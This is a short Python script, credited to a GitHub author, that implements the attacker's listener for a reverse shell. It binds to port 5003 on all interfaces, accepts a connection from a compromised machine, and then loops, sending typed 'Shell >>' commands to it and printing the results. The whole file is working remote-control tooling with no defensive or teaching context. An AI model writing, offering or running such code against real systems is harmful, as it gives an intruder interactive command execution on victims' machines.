#created by Ph3nX-Z : https://github.com/Ph3nX-Z
import socket
host = "0.0.0.0"
port = 5003

buffer = 1024

s = socket.socket()

s.bind((host, port))
s.listen(5)
print(f"Listening at {host}:{port} ...")

client_socket, client_address = s.accept() # accept any connections
print(f"{client_address[0]} on port : {client_address[1]}                    [+]Connected")

while True:
    command = input("Shell >>")
    client_socket.send(command.encode()) # Send commands
    if command.lower() == "exit":
        break
    results = client_socket.recv(buffer).decode()
    print(results) #results of commands
client_socket.close()

s.close()